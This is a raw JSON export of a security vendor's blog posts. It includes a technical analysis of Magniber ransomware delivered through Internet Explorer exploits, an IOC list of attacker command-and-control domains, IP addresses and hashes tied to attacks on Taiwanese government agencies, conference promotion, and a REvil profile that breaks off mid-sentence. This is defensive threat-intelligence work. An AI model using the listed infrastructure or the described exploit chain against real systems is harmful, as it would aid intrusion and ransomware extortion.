 4 月下旬期間，已曝光的業者就包括：臺灣電腦大廠宏碁，封測大廠日月光集團旗下孫公司 Asteelflash Group，以及筆電代工大廠廣達。\n\n而這三起事件的共通點，背後都是同一駭客組織所為，其中日月光集團孫公司事發後已公布調查結果，是遭 REvil 勒索軟體攻擊，至於宏碁與廣達的事件，他們雖沒有說明是哪支勒索軟體，但有不少資安專家都明確指出：應是遭到 REvil 勒索軟體攻擊。\n\n到底這個 REvil 的身分與來歷是什麼？在今年臺灣資安大會上，長期追蹤研究駭客活動的 TeamT5 杜浦數位安全執行長蔡松廷，特別針對 REvil 的背景，將目前已經曝光的資訊做出全面統整，透過對此犯罪組織的側寫與描述，幫助臺灣資安界對 REvil 背後的攻擊族群，能有更全面的了解。\n\n[點此閱讀完整報導](https://www.ithome.com.tw/news/144900)\n\n\u003cbr\u003e\n","__v":0,"id":"60c196993f9d29004041a4e2"}],"createdAt":"2021-06-10T04:35:37.038Z","updatedAt":"2021-07-12T09:26:32.679Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1623300120/ithome_TT_R_Evil_833fb5b0f0.jpg","id":"60c196993f9d29004041a4e1"},{"publish":true,"enable_form":false,"tags":["60ebe0043f9d29004041a536","60ebe0263f9d29004041a537","6010ed99c56e80003f9859b1"],"relative_posts":["6098e8e32107530037594ad3","6077e82e2107530037594a03"],"_id":"60ebddd53f9d29004041a52f","post_url":"internet-explorer-the-vulnerability-ridden-browser","post_name":"「勒」此不疲，IE 真調皮","contents":[{"locale":"tw","_id":"60ebddd53f9d29004041a530","title":"「勒」此不疲，IE 真調皮","context":"By Tom, Peter \u0026 Jason3e7 | 圖片來源：[Pixabay](https://pixabay.com/illustrations/browser-web-www-computer-773273/)\n\n近期全球籠罩在勒索軟體的威脅下，大到法人企業、小至個人用戶，無一倖免。從針對式的 APT 攻擊（Advanced Persistent Threat，進階持續性攻擊）到各式網路犯罪組織，使用的勒索手法越發精湛與多樣化，並發展出 Ransomware as a Service（RaaS）商業模式，實現了「一時勒索一時爽，一直勒索一直爽」的勒索大業。\n\n本次分析的案例，攻擊手法屬於較被動的方式，透過微軟瀏覽器 IE （Internet Explorer）的弱點來進行勒索，而非從企業的脆弱點進行攻擊，進而入侵到核心系統大量散布勒索軟體。這種「願者上鉤」的攻擊方式，攻擊者等待受害單位使用 IE 瀏覽器造訪惡意網站，再發動攻擊、達成目的。\n\n## 技術分析\n\ntenki[.]tw 早期是用來提供氣象資訊的網站，根據我們的研究，推測可能遭攻擊者註冊，當使用者造訪該網站時，將進行兩次轉址，經過兩個廣告公司網站後，最終轉至惡意網站，流程如下圖。\n\n![IE_1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073503/IE_1_9c89756204.png)\n\n\n\u003cbr\u003e\n\n其中 {random}.doetax.site 包含以下已經過程式碼混淆（Obfuscation）的 JavaScript：\n\n![IE_2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073503/IE_2_75720d835e.png)\n\n\u003cbr\u003e\n\n經過解碼還原後，可以確定攻擊 payload 會使用 URL 進行 XOR，再使用 execScript 來執行編碼過的 JavaScript，如下圖：\n\n![IE_3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073501/IE_3_7834571d0f.png)\n\n\u003cbr\u003e\n\n該編碼過的 JavaScript 使用的是 CVE-2020-0968 來針對 IE 瀏覽器進行攻擊。\n\n![IE_4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073500/IE_4_d1df7d6427.png)\n\n\u003cbr\u003e\n\n執行惡意程式碼後，攻擊者會再依據取得的權限不同，將使用者連線到不同的網址，如下圖：\n\n![IE_5.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073500/IE_5_8167c3864c.png)\n\n\u003cbr\u003e\n\n若取得是高權限，則會直接到 hxxp://1fbw726f22j65y.doetax.site/ 取得勒索軟體，否則會先到 hxxp://2oct37evecvdw72y0b.doetax.site/ 下載惡意程式，提權後連線到 hxxp://1fbw726f22j65y.doetax.site/  取得勒索軟體，如下圖所示。\n\n![IE_6.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073497/IE_6_8cf56ced86.png)\n\n\u003cbr\u003e\n\n經分析後確定勒索軟體為 Magniber，該惡意程式使用 AES CBC mode 加密檔案（key, IV: 128），加密完成後，會使用 RSA 演算法加密 key 與 IV，加密後的 blob 會放在加密檔案的最後面（長度：100h）。\n\n![IE_7.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073496/IE_7_8d674f100c.png)\n\n![IE_8.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073493/IE_8_b0ab9e49b9.png)\n\n\u003cbr\u003e\n\n另外我們也發現，除了使用 CVE-2020-0968 來攻擊外，也有使用 CVE-2021-26411 進行勒索攻擊的情境。\n\n![IE_9.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073491/IE_9_a0a080b8f8.png)\n\n![IE_10.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073491/IE_10_36fdab639d.png)\n\n\u003cbr\u003e\n\n我們進一步探討網站轉址狀況可以發現，攻擊者會利用免費資源網站來吸引使用者瀏覽，同時利用一透明框架覆蓋於網站上，讓使用者點擊，進而達成轉址目的。\n\n![IE_11.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073490/IE_11_080a2e35e5.png)\n\n\u003cbr\u003e\n\n轉跳後的網站如下圖：\n\n\u003cbr\u003e\n\n![IE_12.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073490/IE_12_9549f3a339.png)\n\n\u003cbr\u003e\n\n雖然該網站並不會植入勒索軟體，但會使用 CVE-2019-1367 弱點來植入其他的後門，另外，雖然在 IE11、IE10 和 IE9 使用 Jscript9.dll，並不受 CVE-2019-1367 漏洞的影響，但可以強制 IE 使用 IE8 兼容模式，來達成漏洞的觸發。\n\n![IE_13.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073490/IE_13_9dff2ee47b.png)\n\n![IE_14.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073491/IE_14_247f61ede7.png)\n\n\n## 結論\n上述案例皆為採證 IE 的連線紀錄後所發現，攻擊者透過 IE 瀏覽器的漏洞來達到攻擊目的，包含勒索或者植入其他後門程式。攻擊者透過這些弱點進行記憶體操作的攻擊，可以有效實踐無檔案式（Fileless）攻擊，以利規避一些資安產品偵測的可能性。\n\n微軟官方也預計於 2022 年 6 月 25 日，徹底終止支援 IE 瀏覽器，接下來我們也可以預期，若 IE 將來仍被發現存在重大弱點時，攻擊者可能會依循類似手法，大量進行攻擊、勒索，以達到其商業利益。\n\n## 建議\n- 建議將系統安全性更新至最新版本\n- 建議評估汰換已停止更新的作業系統與軟體\n- 非必要不使用 IE 瀏覽器\n\n## 參考資料\n[1] https://asec.ahnlab.com/en/19273/\n\n[2] https://asec.ahnlab.com/en/21189/\n\n\u003cbr\u003e\n","__v":0,"id":"60ebddd53f9d29004041a530"}],"createdAt":"2021-07-12T06:14:45.795Z","updatedAt":"2021-07-21T03:50:11.030Z","__v":1,"topic":"5ecaa004a792d70040a0d8b0","author":"60ebdf963f9d29004041a534","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1626072162/browser_773273_1920_860892cf7d.jpg","publish_date":"2021-07-21T03:30:00.000Z","id":"60ebddd53f9d29004041a52f"}],"id":"6098e8e32107530037594ad3"},{"publish":true,"enable_form":false,"tags":[{"_id":"5ece28882e1ee4004aa406f2","name":"Taiwan","createdAt":"2020-05-27T08:44:56.558Z","updatedAt":"2020-05-28T07:48:46.700Z","__v":0,"id":"5ece28882e1ee4004aa406f2"},{"_id":"5ecf890dfedd7f004b26978e","name":"APT","createdAt":"2020-05-28T09:49:01.076Z","updatedAt":"2020-10-14T03:41:17.235Z","__v":0,"id":"5ecf890dfedd7f004b26978e"},{"_id":"5eec1435163518003f86d92e","name":"cyber threat intelligence","createdAt":"2020-06-19T01:26:13.025Z","updatedAt":"2020-10-14T03:42:12.270Z","__v":0,"id":"5eec1435163518003f86d92e"},{"_id":"609b55892107530037594b0c","name":"威脅情資","createdAt":"2021-05-12T04:11:53.260Z","updatedAt":"2021-05-12T04:11:53.273Z","__v":0,"id":"609b55892107530037594b0c"}],"relative_posts":[{"publish":true,"enable_form":false,"tags":["5f3fdebe163518003f86dad8","5ecf6d12fedd7f004b26974e","5f3fdef3163518003f86dad9","5f3fdefb163518003f86dada","5ecf890dfedd7f004b26978e"],"relative_posts":["5fd95f48542153003465f6e3"],"_id":"5f3fdeb5163518003f86dad5","post_url":"mjib-holds-briefing-on-chinese-hackers-attacks-on-taiwanese-government-agencies","post_name":"調查局 08/19 公布中國對台灣政府機關駭侵事件說明","contents":[{"locale":"tw","_id":"5f3fdeb5163518003f86dad6","context":"圖片來源：[Unsplash](https://unsplash.com/photos/8OyKWQgBsKQ)\n\n# 前言\n\n法務部調查局綜整近期所偵辦的數起台灣政府機關遭駭案件，於 19 日發表記者會，提到政府部門的委外資訊服務供應商遭中國駭客組織攻擊現況，目前已知有市政府、水資源局等至少 10 個單位，以及 4 家資訊服務供應商遇害。\n\n調查局資安工作站也發現，駭客在入侵政府機關內部的主機與伺服器後，為了要長期潛伏以及將獲取資料傳出，還會安裝 SoftEther VPN 程式，以連線到駭客指定的中繼站。\n\n本次調查局公布的攻擊族群：MustangPanda、APT40、Blacktech 與 Taidoor，皆是 TeamT5 長期追蹤的標的，我們有信心能夠偵測這些族群使用的後門程式、駭客工具以及攻擊手法。\n\n![0822-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598021396/0822-1_2529e698d3.png)\n*圖一、駭客透過供應鏈攻擊我政府機關 -1（圖片來源：法務部調查局）*\n\n![0822-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598021396/0822-2_a119c17629.png)\n*圖二、駭客透過供應鏈攻擊我政府機關 -2（圖片來源：法務部調查局）*\n\n\u003cbr\u003e\n\n# IOC 情資\nTeamT5 長期進行駭客追蹤研究，根據法務部調查局所提供的情資內容，關聯出駭客族群慣用的惡意程式與相關 IOC 情資供使用者匯入至閘道端或端點防護設備比對使用，詳細惡意程式說明與 IOC 清單如下所示。\n\n\u003cbr\u003e\n\n|惡意程式家族|類型|描述|攻擊族群|首次出現|\n|----|----|----|----|----|\n|dbgPrint |RAT |dbgPrint 為中國駭客族群 HUAPI 慣用的後門程式，其名稱來自於該後門程式早期版本的字串(strings)內容。dbgPrint 後門程式通常由 PE 型態的 Loader、插入 shellcode 的 DLL 檔及惡意 Payload 所組成。同時也具備防毒免殺(anti-antivirus)的功能模組。|HUAPI (又稱為 Plead 或 Blacktech)|2009 年|\n|CobaltStrike Beacon |RAT |Cobalt Strike 是一款滲透測試或紅隊演練常使用的攻擊框架，而 CobaltStrike Beacon 則是從 Cobalt Strike 攻擊框架所產生的惡意 Payload。雖然 Cobalt Strike 為商業付費工具，但是經過破解並流傳於許多論壇或網站中，因此有許多駭客皆透過他進行惡意攻擊。|商業付費工具，無法明確定義出背後的攻擊族群|2016 年|\n\n*表一、惡意程式分析說明*\n\n\u003cbr\u003e\n\u003cbr\u003e\n\n|IOC|類型|提供來源|\n|----|----|----|----|\n|manage.lutengtw.com|Domain|法務部調查局|\n|dccpulic.lutengtw.com|Domain|法務部調查局|\n|trust.utoggsv.com|Domain|法務部調查局|\n|wg1.inkeslive.com|Domain|法務部調查局|\n|k3ad01.rutentw.com|Domain|法務部調查局|\n|ams05.csksogo.com|Domain|法務部調查局|\n|edgekey.whybbot.com|Domain|法務部調查局|\n|shed.inkeslive.com|Domain|法務部調查局|\n|ap21.gckerda.com|Domain|法務部調查局|\n|cornerth.com|Domain|法務部調查局|\n|teamcorner.nctu.me|Domain|法務部調查局|\n|43.240.12.81|IP Address|法務部調查局|\n|45.124.25.31|IP Address|法務部調查局|\n|45.124.25.226|IP Address|法務部調查局|\n|103.193.149.26|IP Address|法務部調查局|\n|103.240.202.34|IP Address|法務部調查局|\n|a8373a143a915518a33c4af19fff01e7|MD5 Hash|TeamT5|\n|20714b487b5b63ff8e52b911d19d6da1|MD5 Hash|TeamT5|\n|6c490c833bfff677c89d9bb81bef0cf5|MD5 Hash|TeamT5|\n|d395580fea6fb840798dc1ee65756484|MD5 Hash|TeamT5|\n|4a1941df8b251716f66e2777425ac0e5|MD5 Hash|TeamT5|\n|c11f40af68c07b309bd103d69b7bb14a|MD5 Hash|TeamT5|\n|387fe30ffc270939c299d1eaebcdcd4d|MD5 Hash|TeamT5|\n|93bfdce35e3ab86508e09deedca6552f|MD5 Hash|TeamT5|\n|1857fbce5c5269a1d4e40204ccccd7d1|MD5 Hash|TeamT5|\n|www.kaspersky-security.net|Domain|TeamT5|\n|www.symantec-endpoint.net|Domain|TeamT5|\n|www.symantec-product.com|Domain|TeamT5|\n|update.symantec-product.com|Domain|TeamT5|\n|update.trendmicro-service.com|Domain|TeamT5|\n|googleupdatesrv.com|Domain|TeamT5|\n|103.234.96.213|IP Address|TeamT5|\n|103.242.0.152|IP Address|TeamT5|\n|43.240.12.80|IP Address|TeamT5|\n|43.240.12.82|IP Address|TeamT5|\n|43.240.12.83|IP Address|TeamT5|\n|45.32.43.59|IP Address|TeamT5|\n|45.76.189.109|IP Address|TeamT5|\n\n*表二、IOC 清單*\n\n\u003cbr\u003e\n\nThreatSonar 惡意威脅鑑識分析平臺的用戶，可將上方表二之 IOC 匯入以強化威脅偵測與識別，亦可追溯比對過去資料是否命中 IOC。示意圖如下。\n\n![0822-3.2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598078952/0822-3.2_a52efbee16.png)\n*圖三、ThreatSonar 支援 Hash、IP 及 Domain IOC 情資匯入*\n\n\u003cbr\u003e\n\n# 如何透過威脅狩獵找出 SoftEther VPN 程式\n根據法務部調查局的偵辦結果，駭客為了長期潛伏於受害環境，因此會透過 SoftEther 這類的合法 VPN 程式進行遠端控制。ThreatSonar 具備主動威脅狩獵（Threat Hunting）功能，故可以快速地在環境中找出 SoftEther VPN 程式。\n\n其步驟為在威脅狩獵（Hunter）功能中，切換 Scope 至憑證（Certificate），搜尋 \"filename ~ softether\"（請選擇 Engine Version 為全選），可依憑證內容搜尋環境內符合條件的 SoftEther 憑證及其對應的端點與程式清單。其流程步驟示意圖如下。\n\n![0822-4.2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598078952/0822-4.2_7ff72c52b4.png)\n*圖四、以 filename 查詢符合條件的 SoftEther 憑證*\n\n\u003cbr\u003e\n\n![0822-5.2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598078951/0822-5.2_63428b1e98.png)\n*圖五、具備 SoftEther 憑證的端點與程式清單*\n\n\u003cbr\u003e\n\n![0822-6.2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1598078951/0822-6.2_418ed6f1a2.png)\n*圖六、駭客將 SoftEther VPN 程式偽裝成 svchost.exe*\n","title":"調查局 08/19 公布中國對台灣政府機關駭侵事件說明","createdAt":"2020-08-21T14:48:21.182Z","updatedAt":"2020-08-22T07:19:21.410Z","__v":0,"id":"5f3fdeb5163518003f86dad6"}],"createdAt":"2020-08-21T14:48:21.166Z","updatedAt":"2021-01-27T04:40:55.494Z","__v":1,"author":"5eeae43e163518003f86d914","topic":"5ecaa01fa792d70040a0d8b2","publish_date":"2020-08-22T07:00:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1598023063/markus-spiske-8OyKWQgBsKQ-unsplash_%281%29_ced6b5f864.jpg","id":"5f3fdeb5163518003f86dad5"},{"publish":true,"enable_form":false,"tags":["5ece28882e1ee4004aa406f2","5eec1394163518003f86d929","5f979c9e1d1f9c004b931d5c","6063e4e43e88da003f2f660c"],"relative_posts":["5f2cd17b163518003f86da5b","609899422107530037594a80","60a365f93f9d29004041a487","609b4c052107530037594b01","60b5e6a53f9d29004041a4cd","6077e82e2107530037594a03"],"_id":"6059a16cc56e80003f985a6f","post_url":"cybersec-2021","post_name":"【CYBERSEC 2021 台灣資安大會】企業防駭，交給 TeamT5","contents":[{"locale":"tw","_id":"605a9d11c56e80003f985a7a","title":"【CYBERSEC 2021 台灣資安大會】企業防駭，交給 TeamT5","context":"\u003cbr\u003e\n\n全臺最大的年度資安盛會 CYBERSEC 2021 臺灣資安大會，將在 5 月 4 日至 5 月 6 日於南港展覽二館超規格登場！今年，TeamT5 杜浦數位安全很榮幸擔任大會的鑽石級贊助夥伴，面對無所不在的網路威脅，以及不斷進化、「數位轉型」的勒索軟體攻擊，身為臺灣本土資安廠商，我們將持續為大家洞悉網路威脅，精準防駭。\n\n\u003e 節目單在手，講座不漏聽：完整攤位限定講座節目單[點此下載](https://lihi1.cc/Pi626)。\n\n\u003cbr\u003e\n\n# 企業防駭，交給 TeamT5\n\n![展攤位置圖_改搜索實境.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619071416/_497fed2229.png)\n\n\u003cbr\u003e\n\n## #L03 主攤位 | TeamT5 杜浦數位安全\n\n無論是面對駭客威脅想找解方、對勒索軟體束手無策，還是有各種資安防護的疑難雜症 ... 別駭怕，快來 **#L03** 攤位找 **TeamT5 杜浦數位安全**！\n\n除了我們獨特的威脅解決方案，現場還有產品 Demo、攤位限定講座、資安小遊戲，以及徵才駐點面談等精彩內容，錯過再等明年！\n\n\u003cbr\u003e\n\u003cstyle\u003e\nspan.post-cybersec-2021-dot {\njustify-content: center;\ncolor: #d83751;\nfont-family: initial;\nwidth: 1em;\nfont-size: 22px;\nmargin-right: 12px;\n}\n\u003c/style\u003e\n\u003ch3 id=\"teamt5-moma\"\u003e\n  \u003cspan class=\"post-cybersec-2021-dot\"\u003e•\u003c/span\u003e\u003cspan\u003e臺灣資安大會首次登場，TeamT5 MoMA\u003c/span\u003e\n\u003c/h3\u003e\n\n他們是誰？來自哪個國家？好奇總是躲在暗處、神秘莫測的駭客攻擊族群究竟長什麼模樣嗎？\n\n誰說資安艱澀又無聊，跟著 TeamT5 的視角，帶您一同探索當代 APT 攻擊族群的神秘世界。\n\n\u003cbr\u003e\n\n*更多關於 TeamT5 MoMA 的展覽訊息，請隨時鎖定 TeamT5 [Facebook 粉絲專頁](https://www.facebook.com/TeamT5.org)。\n\n\u003cbr\u003e\n\n\n\u003ch3\u003e\n  \u003cspan class=\"post-cybersec-2021-dot\"\u003e•\u003c/span\u003e\u003cspan\u003eTeamT5 攤位限定講座\u003c/span\u003e\n\u003c/h3\u003e\n\nL03 主攤位的限定講座，涵蓋四大精彩主題：**加密勒索攻擊防護**、**駭客情資追蹤**、**威脅狩獵指南**、**企業資安防護一次到位**，多元內容、一次滿足！我們也特地邀請到資安產業的專家，與大家分享資安海外拓展的成功經驗，以及對抗勒索軟體的應對之道，大咖雲集，不聽可惜！不只多場專業講座，我們也將在 CYBERSEC 2021 臺灣資安大會獨家公開 TeamT5 威脅狩獵解方 [ThreatSonar](https://teamt5.org/tw/products/threatsonar/) 的全新功能，\b敬請期待更強大、全面升級的威脅捕網！\n\n![facebook_Post_0504.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619518646/facebook_Post_0504_188c94772c.png)\n\n![facebook_Post_資安海外拓展交流.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619751063/facebook_Post_1f01f9d820.jpg)\n\n![facebook_Post_0505.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619518646/facebook_Post_0505_6ab020f1f5.png)\n\n![圖片5.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619884408/5_7cfb9d9ff9.jpg)\n\n![facebook_Post_0506.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619518646/facebook_Post_0506_e691090746.png)\n\n\u003cbr\u003e\n\n每日中午時段還有 **TeamT5 Show 一下**，安排 TeamT5 MoMA 攻擊族群博物館限定導覽、搜索實境遊戲「1337 Operation」關主現身說法，獨家公布破關彩蛋，以及「資安 Show Time」問答賽，歡迎各位前來參觀同樂。\n\n![facebook_Post_0504-0506.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619518646/facebook_Post_0504_0506_37a651b222.png)\n \n\u003cbr\u003e\n\n## #CP01 Playground | 1337 Operation 搜索實境\n \nTeamT5 團隊精心設計，融入真實情節的搜索實境駭客版，首次於資安大會 CYBERSEC Playground 亮相！\n \n歡迎大家到 **#CP01** 遊戲攤位大展身手，1337 Operation 搜索實境，TeamT5 探員等你來挑戰！\n \n*更多資訊請見[臺灣資安大會官網](https://cyber.ithome.com.tw/2021/playground#teamT5)。\n \n![1337.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1617477157/1337_6a0024e9ad.png)\n \n\u003cbr\u003e\n\n## #CT11 Cyber Talent Connect | 徵才專區\n\n今年臺灣資安大會加碼增設的 Cyber Talent Connect 專區，透過培育計畫、主題講座、職涯互動及企業徵才，協助在學學生與社會新鮮人更了解業界人才需求，以及進入資安領域的職能發展。\n\nTeamT5 杜浦數位安全在 **#CT11** 攤位，歡迎有志進入資安產業的朋友們來參觀了解。也歡迎大家來 Cyber Talent 講座，聽聽我們的企業分享與最新市場徵才趨勢，**#L03 **主攤位亦設有** TeamT5 徵才駐點**，對我們最新職缺有興趣的朋友，記得到主攤位來逛逛喔！\n\n![facebook_Post_Turkey.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618837343/facebook_Post_Turkey_291def5611.png)\n\n\u003cbr\u003e\n\n## TeamT5 大會主題議程\n\nTeamT5 強大講師陣容將再次登上大會主題演講，除了去年好評不斷的 CyberLAB 資安攻防演練工作坊重出江湖，還有今年最受矚目的大會主題論壇「701 漏洞研究室」與「目標式勒索威脅論壇」，我們的「TeamT5 Camp 大師帶你學」系列資安入門課程，也搬上資安大會，帶大家深入淺出探索資安最新技術與趨勢。更別錯過 TeamT5 執行長蔡松廷（TT）的精彩主題演講與 Free Talk 喔！\n\n\u003cbr\u003e\n\n** 1. 【Keynote：跟阿中學勒索軟體防疫之道】**\n\n台灣防疫成功，全世界有目共睹。防禦網路攻擊，其實與防疫有許多微妙的相似之處。這場演講，TeamT5 執行長蔡松廷（TT）會跟大家分享，我們如何從防疫中學習到對抗勒索軟體的策略，以及我們如何實作出有效的解決方案。\n\n![facebook_Post_TT_Keynote.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618837343/facebook_Post_TT_Keynote_a52a0312e1.png)\n\n\u003cbr\u003e\n\n** 2.【貓味，你坐阿！】資安鑑識五連鞭！**\n\nAPT 攻擊手法複雜多樣，企業受駭也不知該從何找起入侵來源。TeamT5 工程師 Zet、Tom 和 Jason3e7 將在本場講座，帶大家從資安事件調查的實戰演練，拼湊攻擊事件原貌。\n\n![facebook_Post_Zet+Tom+Jason3e7.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619077480/facebook_Post_Zet_Tom_Jason3e7_515b316d8c.jpg)\n\n\u003cbr\u003e\n\n** 3.【701 漏洞研究室】**\n\n白衣渡江，貓味不講武德？這題目有看沒有懂？TeamT5 最幽默的講師群，我們的資安工程師 Tom、Jason3e7 和 Peter，將為大家帶來一場詼諧又知識量爆棚的精彩講座！\n\n![facebook_Post__Tom+Jason3e7+Peter.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1617263321/facebook_Post_Tom_Jason3e7_Peter_37d9599950.jpg)\n\n\u003cbr\u003e\n\n** 4.【大大們的 Free Talk】**\n\n來聽聽 TeamT5 執行長 TT 大大，分享（碎念）本人的資安產業經驗，一起聊聊台灣資安廠商的美麗與哀愁。\n\n![facebook_Post_TT_FreeTalk.jpg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619751063/facebook_Post_TT_Free_Talk_956eae9ab2.jpg)\n\n\u003cbr\u003e\n\n** 5.【TeamT5 Camp 大師帶你學】**\n\nTeamT5 Camp 的講師群也在資安大會開課囉！整整一天、三堂滿滿的資安入門課程，聽一天課抵十年，名額有限，記得把握機會到現場報名。\n\n![facebook_Post_Kenny.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618837342/facebook_Post_Kenny_f343a32e2e.png)\n![facebook_Post_Still.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618837343/facebook_Post_Still_a8b296d6f9.png)\n![facebook_Post_zha.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618837343/facebook_Post_zha_dd9d531244.png)\n\n\u003cbr\u003e\n\n** 6.【一言不合就公開！REvil 勒索不講武德】**\n\n大會主打主題論壇之一，讓 TeamT5 執行長 TT 為大家揭秘「2020 年度勒索界首富」- REvil。\n\n![facebook_Post_TT_一言不合就公開！ REvil 勒索不講武德.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1619751242/facebook_Post_TT_R_Evil_78dd109ab5.png)\n\n\u003cbr\u003e\n\n\u003e 更多大會議程資訊 \u0026 展攤活動即將公開，敬請隨時鎖定 TeamT5 [Facebook 粉絲專頁](https://www.facebook.com/TeamT5.org)。\n\n\u003cbr\u003e\n","__v":0,"id":"605a9d11c56e80003f985a7a"}],"createdAt":"2021-03-23T08:06:04.117Z","updatedAt":"2021-07-12T09:26:32.679Z","__v":0,"author":"5eec3483163518003f86d943","topic":"5ecaa043a792d70040a0d8b5","publish_date":"2021-04-07T03:00:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1617067914/post_cfead0bebf.png","id":"6059a16cc56e80003f985a6f"},{"publish":true,"enable_form":false,"tags":["6077eb812107530037594a0d","6063e4e43e88da003f2f660c","609b55892107530037594b0c"],"relative_posts":["609899422107530037594a80","6059a16cc56e80003f985a6f","60a365f93f9d29004041a487","6098e8e32107530037594ad3","60b5e6a53f9d29004041a4cd"],"_id":"609b4c052107530037594b01","post_name":"【工商時報】又一重大勒索軟體攻擊 TeamT5：資安防禦做對方向是關鍵","post_url":"ctee-teamt5-threat-intelligence-is-key-to-strengthening-cyber-defenses","contents":[{"locale":"tw","_id":"609b4c052107530037594b02","title":"【工商時報】又一重大勒索軟體攻擊 TeamT5：資安防禦做對方向是關鍵","__v":0,"context":"上週美國輸油管系統營運商遭到勒索軟體攻擊，暫停所有管線運作，可能造成燃料短缺而導致油價上漲，引發市場擔憂，而近年層出不窮的勒索攻擊事件，日益嚴重，目標式攻擊手法推陳出新，已非傳統防禦方式所能抵擋，有效的資安防護成為市場迫切之需。\n\nTeamT5 杜浦數位安全（以下簡稱 TeamT5）創辦人兼執行長蔡松廷表示：「面對進階型的威脅，防禦會是比較困難的，資安最難的地方在於要做的事太多了，做對了就會有效，如果做錯方向，對於防護就沒有效果。 TeamT5 由端點切入，提供 MDR（Managed Detection and Response，威脅偵測應變）從雲端偵測異常並通報，比較特別的是，TeamT5 團隊做很多情資研究，透過對攻擊者的了解，可以預測到他的下一步，讓客戶知道什麼防護要先做，做真正對的方向。」\n\n[點此閱讀完整報導](https://ctee.com.tw/industrynews/technology/457958.html?fbclid=IwAR02bz0y_3a5APIwS6PhC5HpJnMTW1YJ-CF8igPda-hxE8r-OAYXHoIQbEQ)\n\n\u003cbr\u003e\n","id":"609b4c052107530037594b02"}],"createdAt":"2021-05-12T03:31:17.161Z","updatedAt":"2021-06-10T04:41:15.817Z","__v":1,"author":"5eec3483163518003f86d943","topic":"5ecaa036a792d70040a0d8b4","publish_date":"2021-05-10T05:00:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1620791442/AX_0_7048_7e68a71115.jpg","id":"609b4c052107530037594b01"},{"publish":true,"enable_form":false,"tags":["6098f2082107530037594ae5","6077eb8c2107530037594a0e","5fd1d9839f8bdc004a7fdf55","60ebe0263f9d29004041a537"],"relative_posts":["60a365f93f9d29004041a487","609899422107530037594a80","60487aacc56e80003f985a39","60c196993f9d29004041a4e1","6077e82e2107530037594a03"],"_id":"6098e8e32107530037594ad3","post_url":"introducing-the-most-profitable-ransomware-revil","post_name":"Introducing The Most Profitable Ransomware REvil","contents":[{"locale":"en","_id":"6098e8e32107530037594ad4","context":"*Image courtesy of [Pixabay](https://pixabay.com/illustrations/security-hacker-web-security-data-5614016/)\n\nIn March 2021, another REvil's attack was announced. Targeting the computer giant Acer, the actors behind the ransomware asked for 50 million dollars, the highest ransom they have demanded so far. Acer was not the only victim of the notorious ransomware. Debuted in April 2019, REvil has attacked hundreds of high-profile agencies in multiple sectors. In 2020, REvil has earned more than 100 million.[1] In this report, we will introduce the basic profile of REvil and share the techniques they used in operations. \n\n\n## What is REvil \n\nREvil, a.k.a Sodinokibi, is a Ransomware as a Service (RaaS) operation deployed by a Russian cybercrime group named GOLD SOUTHFIELD or Pinchy Spider. The group is believed to be based in Russia, as it does not attack organizations in Post-Soviet States, and refuse to cooperate with English speaking cyber criminals.[2] \n\nREvil was highly possible the successor of GandCrab, another notorious ransomware, because of code similarities and REvil's active operations right after GandCrab's retirement.[3]\n\n![REvil_1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845336/R_Evil_1_035a848033.png)\n_Figure 1: The timeline of REvil's appearance and GandCrab's retirement_\n\n\u003cbr\u003e\n\n![REvil_2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_2_804b2676dc.png)\n_Figure 2: REvil and GandCrab's similarity on string decoding_\n\n\u003cbr\u003e\n\n![REvil_3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_3_e9724a2992.png)\n_Figure 3: REvil and GandCrab's similarity on building ransom wallpaper_\n\n\u003cbr\u003e\n\nNumerous campaigns attacking multiple sectors were observed all over the world. The REvil actors has attacked local governments, giant law firms, multinational retailers, etc. The highest ransom they have asked was 42 million for the law firm but was now surpassed by the 50 million Acer attack. (References for the events, please see the end of this 